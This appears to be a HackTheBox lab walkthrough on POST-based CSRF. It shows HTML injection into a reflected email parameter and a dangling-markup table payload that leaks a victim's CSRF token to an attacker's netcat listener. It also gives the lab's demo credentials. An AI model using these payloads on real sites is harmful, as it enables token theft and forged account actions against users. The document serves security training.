# Cross-Site Request Forgery (POST-based)

Navigate to `http://csrf.htb.net` and log in to the application using the credentials below:

* Email: heavycat106
* Password: rocknrol

This is an account that we created to look at the application's functionality.

After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>`

<figure><img src="../../../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

Notice that the email is reflected on the page. Let us try inputting some HTML into the _email_ value, such as:

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

<figure><img src="../../../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.

<figure><img src="../../../../.gitbook/assets/image (1158).png" alt=""><figcaption></figcaption></figure>

Let us first instruct Netcat to listen on port 8000, as follows.

```shell-session
eldeim@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim.

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

<figure><img src="../../../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>
